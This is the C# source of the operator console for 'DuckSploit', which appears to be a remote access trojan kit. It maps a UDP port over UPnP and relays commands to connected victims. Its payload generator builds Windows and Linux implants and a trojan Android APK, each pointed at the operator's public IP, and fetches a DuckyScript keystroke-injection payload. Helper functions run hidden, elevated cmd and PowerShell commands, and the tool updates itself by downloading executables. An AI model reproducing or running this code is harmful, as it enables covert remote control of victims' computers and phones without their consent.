using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Collections.Generic;
using System.IO.Compression;
using System.Web;
using System.Threading;
using System.Text.RegularExpressions;
using System.Drawing;
using System.Windows.Forms;
using DScompiler;
using DScrypter;
using Mono.Nat;
using dsforms;

namespace DSserver
{
    class Program
    {
		public static string public_ipv4 = "undefined";
		public static string version = "1.1";
		public static string version_build = "#beta";
		
		
		public static void Download(string url, string outPath)
		{
			ServicePointManager.Expect100Continue = true;
			ServicePointManager.SecurityProtocol = (SecurityProtocolType)(0xc00);
			
			
			string tempdir = Path.GetTempPath();
			new WebClient().DownloadFile(url, outPath);
			
		}
		public static void write_txt_to_file(string path, string str)
		{
			FileStream streamfile = new FileStream(path, FileMode.OpenOrCreate, FileAccess.Write);
            // create stream writer
            StreamWriter streamwrite = new StreamWriter(streamfile);
            // add some lines
			
            streamwrite.WriteLine(str);
            // clear streamwrite data
            streamwrite.Flush();
            // close stream writer
            streamwrite.Close();
            // close stream file
            streamfile.Close();
		}
		public static void execute(string path)
        {
			// runas admin
			ServicePointManager.Expect100Continue = true; 
			ServicePointManager.SecurityProtocol = (SecurityProtocolType)(0xc00);
			System.Diagnostics.Process process = new System.Diagnostics.Process();
			System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
			startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
			startInfo.FileName = "cmd.exe";
			startInfo.Arguments = "/C call "+path;
			// startInfo.Verb = "runas";
			process.StartInfo = startInfo;
			process.Start();
        }
		public static void execute_cmd(string cmd)
        {
            // runas admin
			ServicePointManager.Expect100Continue = true; 
			ServicePointManager.SecurityProtocol = (SecurityProtocolType)(0xc00);
			System.Diagnostics.Process process = new System.Diagnostics.Process();
			System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
			startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
			startInfo.FileName = "cmd.exe";
			startInfo.Arguments = "/C "+cmd;
			startInfo.Verb = "runas";
			process.StartInfo = startInfo;
			process.Start();
        }
		public static void sendmsg(string message, string color)
		{
			if (color == "red")
			{
				Console.ForegroundColor = ConsoleColor.Red;
				Console.WriteLine(message);
				Console.ResetColor();
			}
			else if (color == "green")
			{
				Console.ForegroundColor = ConsoleColor.Green;
				Console.WriteLine(message);
				Console.ResetColor();
			}
			else if (color == "yellow")
			{
				Console.ForegroundColor = ConsoleColor.Yellow;
				Console.WriteLine(message);
				Console.ResetColor();
			}
			else if (color == "blue")
			{
				Console.ForegroundColor = ConsoleColor.Blue;
				Console.WriteLine(message);
				Console.ResetColor();
			}
		}
		public static void sendmsgnonewline(string message, string color)
		{
			if (color == "red")
			{
				Console.ForegroundColor = ConsoleColor.Red;
				Console.Write(message);
				Console.ResetColor();
			}
			else if (color == "green")
			{
				Console.ForegroundColor = ConsoleColor.Green;
				Console.Write(message);
				Console.ResetColor();
			}
			else if (color == "yellow")
			{
				Console.ForegroundColor = ConsoleColor.Yellow;
				Console.Write(message);
				Console.ResetColor();
			}
			else if (color == "blue")
			{
				Console.ForegroundColor = ConsoleColor.Blue;
				Console.Write(message);
				Console.ResetColor();
			}
		}
		public static string gethtmlcode(string url)
		{
			string tempdir = Path.GetTempPath(); 
			try
			{
				File.Delete(tempdir + "last.txt");
			}
			catch (Exception e)
			{
				// nothin'
			}
			
			string callcommand = "(New-Object System.Net.WebClient).DownloadFile('" + url + "', '" + tempdir + "\\last.txt')";
			
			ProcessStartInfo processInfo;
			Process process;
			
			processInfo = new ProcessStartInfo("powershell.exe", callcommand);
			processInfo.CreateNoWindow = true;
			processInfo.UseShellExecute = false;
			processInfo.RedirectStandardOutput = true;
			process = Process.Start(processInfo);
			process.WaitForExit();

			string path = tempdir + "\\last.txt";
			string readText = File.ReadAllText(path);
			return readText;
			

			
		}
		public static void execpowershell(string cmd)
		{
			// runas admin
			ServicePointManager.Expect100Continue = true; 
			ServicePointManager.SecurityProtocol = (SecurityProtocolType)(0xc00);
			System.Diagnostics.Process process = new System.Diagnostics.Process();
			System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
			startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
			startInfo.FileName = "powershell.exe";
			startInfo.Arguments = cmd;
			startInfo.Verb = "runas";
			process.StartInfo = startInfo;
			process.Start();
		}
		public static void exec_cmd(string cmd)
		{
			ProcessStartInfo processInfo;
			Process process;
			
			processInfo = new ProcessStartInfo("cmd.exe", cmd);
			processInfo.CreateNoWindow = true;
			processInfo.UseShellExecute = false;
			processInfo.RedirectStandardOutput = true;
			process = Process.Start(processInfo);
			process.WaitForExit();
		}
		public static INatDevice device;
		public static bool ipchecked = false;
		
		public static string GetPublicIP() {	
			if(ipchecked = true)
			{
				public_ipv4 = device.GetExternalIP().ToString();
				
				return device.GetExternalIP().ToString();
			}
			else
			{
				return "";
			}
		}
		public static void DeviceFound(object sender, DeviceEventArgs args)
		{
			device = args.Device;
			ipchecked = true;
			
			if(!GetPublicIP().Contains('.'))
			{
				sendmsg("[x] Error: can't get public ip", "red");
				Console.ReadKey();
			}
			
			device.CreatePortMap(new Mapping(Protocol.Udp, 45358, 45358));
		}
        static void Main(string[] args)
        {
			NatUtility.DeviceFound += DeviceFound;
			NatUtility.StartDiscovery();
			
			exec_cmd("start cmd.exe /c taskkill /IM java.exe /f");
			bool pro = false;
			
			
			string userprofile = System.Environment.GetEnvironmentVariable("USERPROFILE");
			string tempdir = Path.GetTempPath(); 
			string dir = userprofile + "\\DuckSploit"; 
			if (! Directory.Exists(dir)) 
			{
				Directory.CreateDirectory(dir);
			}

			
			string profilepath = userprofile + "\\DuckSploit\\pro\\pro.txt"; 
			if (File.Exists(profilepath)) 
			{
				pro = true;
			}
			else
			{
				pro = false;
			}
			
            UDPSocket s = new UDPSocket();
			s.Server("0.0.0.0", 45358);
			int a = 0;
			while(a == 0)
			{
				Console.WriteLine(" ");
				sendmsg("        dP                   dP                         dP          oo   dP   ", "green");
				sendmsg("        88                   88                         88               88   ", "green");
				sendmsg("  .d888b88 dP    dP .d8888b. 88  .dP  .d8888b. 88d888b. 88 .d8888b. dP d8888P ", "green");
				sendmsg("  88'  '88 88    88 88'   `` 88888'`  Y8ooooo. 88'  '88 88 88'  '88 88   88   ", "green");
				sendmsg("  88.  .88 88.  .88 88.  ... 88  '8b.       88 88.  .88 88 88.  .88 88   88   ", "green");
				sendmsg("  '88888P8 '88888P' '88888P' dP   'YP '88888P' 88Y888P' dP '88888P' dP   dP   ", "green");
				sendmsg("                                               88                              ", "green");
				sendmsg("                                               dP                              ", "green");
				sendmsg("                            | DuckSploit V"+version+" |                         ", "green");
				sendmsg("                            build version: "+version_build+"                         ", "yellow");
				if (pro == true)
				{
					sendmsg("> Pro version", "red");
				}
				// # Wait
				sendmsgnonewline("    [", "yellow");
				sendmsgnonewline("1", "red");
				sendmsg("] Wait", "yellow");
				// # Android mod
				sendmsgnonewline("    [", "yellow");
				sendmsgnonewline("2", "red");
				sendmsg("] Credits", "yellow");
				// # Build malware
				sendmsgnonewline("    [", "yellow");
				sendmsgnonewline("3", "red");
				sendmsg("] Generate payload", "yellow");
				// # Visit website
				sendmsgnonewline("    [", "yellow");
				sendmsgnonewline("4", "red");
				sendmsg("] Visit our website", "yellow");
				// # update
				sendmsgnonewline("    [", "yellow");
				sendmsgnonewline("5", "red");
				sendmsgnonewline("] Update", "yellow");
				Console.WriteLine(" ");
				// # pro
				if (pro == true)
				{
					sendmsgnonewline("    [", "yellow");
					sendmsgnonewline("6", "red");
					sendmsgnonewline("] ToolBox", "yellow");
					Console.WriteLine(" ");
				}
				
				// # Exit
				sendmsgnonewline("    [", "yellow");
				sendmsgnonewline("99", "red");
				sendmsgnonewline("] Exit", "yellow");
				Console.WriteLine(" ");

				sendmsgnonewline("Choose option [", "green");
				sendmsgnonewline("1", "yellow");
				sendmsgnonewline(",", "red");
				sendmsgnonewline("2", "yellow");
				sendmsgnonewline(",", "red");
				sendmsgnonewline("3", "yellow");
				sendmsgnonewline(",", "red");
				sendmsgnonewline("4", "yellow");
				sendmsgnonewline(",", "red");
				sendmsgnonewline("5", "yellow");
				sendmsgnonewline(",", "red");
				if (pro == true)
				{
					sendmsgnonewline("6", "yellow");
					sendmsgnonewline(",", "red");
				}
				sendmsgnonewline("99", "yellow");
				sendmsgnonewline("]: ", "green");
				
				string menu = Console.ReadLine(); 
				
				
				if(menu == "1")
				{
					a = 1;
					Console.ForegroundColor = ConsoleColor.Red;
					Console.Write("[");
					Console.ResetColor();
					Console.Write("*");
					Console.ForegroundColor = ConsoleColor.Red;
					Console.WriteLine("] Waiting for connection...");
					while(true)
					{
						if (s.connected)
						{
							string input2;
							Console.ForegroundColor = ConsoleColor.Green;
							Console.Write("DS> ");
							Console.ResetColor();
							
							input2 = Console.ReadLine();
							string[] input = input2.Split(' ');

							if(input[0] == "help")
							{
								sendmsg(gethtmlcode("https://raw.githubusercontent.com/canarddu38/DUCKSPLOIT/root/api/help.txt"), "green");
							}
							else if(input[0] == "clear")
							{
								Console.Clear();

							}
							else if(input2 == "malware --help")
							{
								sendmsg(gethtmlcode("https://raw.githubusercontent.com/canarddu38/DUCKSPLOIT/root/api/malwares/malwarehelp.txt"), "green");
							}
							else if(input[0] == "cls")
							{
								Console.Clear();
							}
							else if(input[0] == "exit")
							{
								Console.Clear();
								sendmsg("[o] Exited from the console.", "red");
								break;
							}
							else if(input[0] == "credits")
							{
								sendmsg(gethtmlcode("https://raw.githubusercontent.com/canarddu38/DUCKSPLOIT/root/api/credits.txt"), "green");
							}
							else
							{
								s.Send(input2);
							}
						}
					}
					s.close();
				}
				else if(menu == "2")
				{
					string newline = "\"";
					sendmsg("DuckSploit Windows (V"+version+" "+version_build, "yellow");
					sendmsg("Licence: AGPL-3.0 license ", "yellow");
					sendmsg("Website: https://ducksploit.com/", "yellow");
					sendmsg("Discord: https://discord.com/invite/sTVWespH4M", "yellow");
					Console.WriteLine(" ");
					sendmsg("          CREDITS          ", "yellow");
					Console.WriteLine(" ");
					sendmsg("c DuckpvpTeam - 2023", "yellow");
					Console.WriteLine(" ");
					sendmsg(@"Developers: 
	Canarddu38
	SoulOfDarkness", "yellow");
				}
				else if(menu == "3")
				{
					// payload generator
					Console.Clear();
					int b = 0;
					while(b == 0)
					{
						sendmsg("DuckSploit payload generator", "green");
						Console.WriteLine(" ");
						sendmsgnonewline("    [", "yellow");
						sendmsgnonewline("1", "red");
						sendmsg("] Windows", "yellow");
						// # Windows
						sendmsgnonewline("    [", "yellow");
						sendmsgnonewline("2", "red");
						sendmsg("] Linux", "yellow");
						// # Linux
						sendmsgnonewline("    [", "yellow");
						sendmsgnonewline("3", "red");
						sendmsg("] Android", "yellow");
						// # dd
						sendmsgnonewline("    [", "yellow");
						sendmsgnonewline("4", "red");
						sendmsg("] DuckyScript", "yellow");
						// # Android
						sendmsgnonewline("    [", "yellow");
						sendmsgnonewline("5", "red");
						sendmsg("] PowerShell", "yellow");
						// # Android
						sendmsgnonewline("    [", "yellow");
						sendmsgnonewline("6", "red");
						sendmsg("] Custom (Build yours)", "yellow");
						// # Android
						sendmsgnonewline("    [", "yellow");
						sendmsgnonewline("99", "red");
						sendmsg("] Exit", "yellow");
						// # exit

						sendmsgnonewline("Choose option [", "green");
						sendmsgnonewline("1", "yellow");
						sendmsgnonewline(",", "red");
						sendmsgnonewline("2", "yellow");
						sendmsgnonewline(",", "red");
						sendmsgnonewline("3", "yellow");
						sendmsgnonewline(",", "red");
						sendmsgnonewline("4", "yellow");
						sendmsgnonewline(",", "red");
						sendmsgnonewline("5", "yellow");
						sendmsgnonewline(",", "red");
						sendmsgnonewline("6", "yellow");
						sendmsgnonewline(",", "red");
						sendmsgnonewline("99", "yellow");
						sendmsgnonewline("]: ", "green");
						
						string menu2 = Console.ReadLine(); 
						if(menu2 == "1")
						{
							//windows payload
							Console.WriteLine("PublicIP: "+GetPublicIP());
							Console.Clear();
							compiler compiler = new compiler();
							compiler.compile("win", GetPublicIP());
							b = 1;
							Console.ReadKey();
						}
						else if(menu2 == "2")
						{
							// linux payload
							Console.WriteLine("PublicIP: "+GetPublicIP());
							Console.Clear();
							Console.WriteLine("Not avaliable");
							b = 1;
							Console.ReadKey();
						}
						else if(menu2 == "3")
						{
							Console.WriteLine("PublicIP: "+GetPublicIP());
							// android payload
							Console.Clear();
							if (Directory.Exists(@"C:\\Program Files\\Java")) {
								sendmsg("[o] java.exe is installed (check if it's version jdk 18)", "yellow");
								Console.WriteLine(" ");
								exec_cmd("start cmd.exe /c taskkill /IM java.exe /f");
								
								if (Directory.Exists(tempdir + "\\DSandroid"))
								{
									System.IO.DirectoryInfo di = new DirectoryInfo(tempdir + "\\DSandroid");

									foreach (FileInfo file in di.GetFiles())
									{
										file.Delete(); 
									}
									foreach (DirectoryInfo dir3 in di.GetDirectories())
									{
										dir3.Delete(true); 
									}
									Directory.Delete(tempdir + "\\DSandroid");
								}
								
								sendmsg("Downloading executable... (This may take few minutes)", "yellow");
								Download("https://github.com/canarddu38/DUCKSPLOIT/raw/root/victim/android/DSpayload.zip", tempdir + "\\DSandroid.zip");
								execute_cmd("powershell Expand-Archive -Path $env:TEMP\\DSandroid.zip -DestinationPath $env:TEMP\\DSandroid");
								sendmsg("Downloaded!", "yellow");
								
								File.WriteAllText(tempdir + "\\DSandroid\\local.properties", "sdk.dir=" + tempdir.Replace(@"\","/") + "/SDK");
								
								if (! Directory.Exists(tempdir + "\\SDK"))
								{
									sendmsg("Downloading android sdk... (This may take again few minutes)", "yellow");
									Download("https://drive.google.com/u/2/uc?id=1Wum_1YsoznOib6uVco6u54eTRB_MniF9&export=download&confirm=t&uuid=bdde3053-eb94-4254-b94b-10e8873666f7", tempdir + "\\SDK.zip");
									execute_cmd("powershell Expand-Archive -Path $env:TEMP\\SDK.zip -DestinationPath $env:TEMP\\SDK");
									sendmsg("Downloaded!", "yellow");
								}
								
								string text = File.ReadAllText(tempdir + "\\DSandroid\\app\\src\\main\\java\\com\\Duckpvp\\DuckSploit\\Horse\\MainActivity.java");
								text = text.Replace("<your ip>", public_ipv4);
								File.WriteAllText(tempdir + "\\DSandroid\\app\\src\\main\\java\\com\\Duckpvp\\DuckSploit\\Horse\\MainActivity.java", text);
								Console.Clear();
								sendmsg("Loading...", "yellow");
								
								execute_cmd("mkdir " + dir + "\\generated");
								execute_cmd("cd " + tempdir + "\\DSandroid&" + tempdir + "\\DSandroid\\gradlew.bat assembleDebug");
								execute_cmd("cls&move %temp%\\DSandroid\\app\\build\\outputs\\apk\\debug\\app-debug.apk %userprofile%\\DuckSploit\\generated");
								execute_cmd("rename \"" + dir + "\\generated\\app-debug.apk\" DSandroid_payload.apk");
								Console.Clear();
								
								sendmsg("DS payload is now generated! ", "yellow");
								sendmsg("Can be found at: " + dir + "\\generated\\DSandroid_payload.apk", "yellow");
							}
							else
							{
								sendmsg("[x] Java JDK18 isn't installed, install it first!", "red");
							}
							b = 1;
							Console.ReadKey();
						}
						else if(menu2 == "4")
						{
							// duckyscript payloads
							Console.Clear();
							int d = 0;
							while(d == 0)
							{
								sendmsg("DuckSploit payload generator (DuckyScript)", "green");
								Console.WriteLine(" ");
								sendmsgnonewline("    [", "yellow");
								sendmsgnonewline("1", "red");
								sendmsg("] Windows", "yellow");
								// # Windows
								sendmsgnonewline("    [", "yellow");
								sendmsgnonewline("2", "red");
								sendmsg("] Linux", "yellow");
								// # Linux
								sendmsgnonewline("    [", "yellow");
								sendmsgnonewline("3", "red");
								sendmsg("] Exit", "yellow");
								// # Exit

								sendmsgnonewline("Choose option [", "green");
								sendmsgnonewline("1", "yellow");
								sendmsgnonewline(",", "red");
								sendmsgnonewline("2", "yellow");
								sendmsgnonewline(",", "red");
								sendmsgnonewline("3", "yellow");
								sendmsgnonewline("]: ", "green");
								
								string menu3 = Console.ReadLine(); 
								if(menu3 == "1")
								{
									Console.WriteLine("PublicIP: "+GetPublicIP());
									Console.Clear();
									compiler compiler = new compiler();
									compiler.compile("win", GetPublicIP());
									Download("https://raw.githubusercontent.com/canarddu38/DUCKSPLOIT/root/api/payloads/payload.dd", dir + "\\generated\\payload.dd");
									sendmsg("DuckyScript payload is generated", "yellow");
									sendmsg("Can be found at: " + dir + "\\generated\\payload.dd", "yellow");
									d = 1;
									Console.ReadKey();
								}
								if(menu3 == "2")
								{
									Console.WriteLine("PublicIP: "+GetPublicIP());
									Console.Clear();
									compiler compiler = new compiler();
									compiler.compile("lin", GetPublicIP());
									d = 1;
									Console.ReadKey();
								}
								if(menu3 == "3")
								{
									Console.Clear();
									d = 1;
								}
							}
							b = 1;
						}
						else if(menu2 == "5")
						{
							// powershell
							Console.Clear();
							b = 1;
						}
						else if(menu2 == "6")
						{
							// custom payoads
							Console.Clear();
							ds_text_gui ds_text_gui = new ds_text_gui();
							Application.Run(new ds_text_gui());
							sendmsg("[o] GUI closed", "green");
							b = 1;
						}
						else if(menu2 == "99")
						{
							Console.Clear();
							b = 1;
						}
						else
						{
							Console.Clear();
							sendmsg("[x] Bad awnser, only 1,2,3,4,5,6 and 99 accepted", "red");
						}
					}
					b = 0;
					
				}
				else if(menu == "4")
				{
					a = 1;
					System.Diagnostics.Process.Start("https://ducksploit.com");
				}
				else if(menu == "5")
				{
					userprofile = System.Environment.GetEnvironmentVariable("USERPROFILE");
					try
					{
						File.Delete(tempdir+"\\newds.exe");
					}
					catch (Exception e)
					{}
					string newversion = gethtmlcode("https://github.com/canarddu38/DUCKSPLOIT/raw/root/hacker/windows/version.txt");
					string[] tempstr = newversion.Split(' ');
					if(tempstr[0] != version)
					{
						sendmsg("[o] New version found: "+newversion, "red");
						sendmsg("=> Current version: "+version+" "+version_build, "red");
					}
					Console.Write("Type any key to continue...");
					Console.ReadKey();
					Console.Clear();
					sendmsg("[~] Updating DuckSploit...", "yellow");
					sendmsg("[~] Downloading...", "yellow");
					string date = DateTime.Now.ToString("hh_mm_dd_MM_yyyy");
					Download("https://github.com/canarddu38/DUCKSPLOIT/raw/root/hacker/windows/ds.exe", tempdir+"\\newds"+date+".exe");
					if (pro == true && File.Exists(userprofile+"\\DuckSploit\\pro\\dstoolbox.exe"))
					{
						sendmsg("> pro updating...", "red");
						Download("https://github.com/canarddu38/canarddu38/raw/main/images/icons/test.zip", userprofile+"\\DuckSploit\\pro\\dstoolbox.exe");
						sendmsg("> pro done", "red");
					}
					sendmsg("[~] Fetching data..", "yellow");
					
					
					// runas admin
					ServicePointManager.Expect100Continue = true; 
					ServicePointManager.SecurityProtocol = (SecurityProtocolType)(0xc00);
					System.Diagnostics.Process process = new System.Diagnostics.Process();
					System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
					startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
					startInfo.FileName = "cmd.exe";
					startInfo.Arguments = "/C start powershell.exe -WindowStyle hidden Start-Sleep 3 & del /q /f "+userprofile+"\\DuckSploit\\ds.exe & copy /y \""+tempdir+"\\newds"+date+".exe\" \""+userprofile+"\\DuckSploit\\ds.exe\"";
					startInfo.Verb = "runas";
					process.StartInfo = startInfo;
					process.Start();
					
					Console.WriteLine("start powershell.exe -WindowStyle hidden Start-Sleep 3 & del /q /f "+userprofile+"\\DuckSploit\\ds.exe & copy /y \""+tempdir+"\\newds"+date+".exe\" \""+userprofile+"\\DuckSploit\\ds.exe\"");
					sendmsg("[o] Done", "green");
					break;
				}
				else if(menu == "6")
				{
					// pro tool box
					if (File.Exists(userprofile + "\\DuckSploit\\pro\\dstoolbox.exe") && pro == true)
					{
						userprofile = System.Environment.GetEnvironmentVariable("USERPROFILE");
						Console.Clear();
						ProcessStartInfo processInfo;
						Process process;
						processInfo = new ProcessStartInfo(userprofile + "\\DuckSploit\\pro\\dstoolbox.exe");
						processInfo.CreateNoWindow = true;
						processInfo.UseShellExecute = true;
						processInfo.RedirectStandardOutput = false;
						process = Process.Start(processInfo);
						process.WaitForExit();
					}
					else
					{
						sendmsg("[x] error...", "red");
					// a = 1;
					}
				}
				else if(menu == "99")
				{
					a = 1;
					Console.Clear();
					sendmsg("[o] Exited from the console...", "red");
				}
				else
				{
					Console.Clear();
					sendmsg("[x] Unknown awnser (only 1,2,3,4,5 or 99 are allowed)", "red");
				}
			}
        }
    }
}
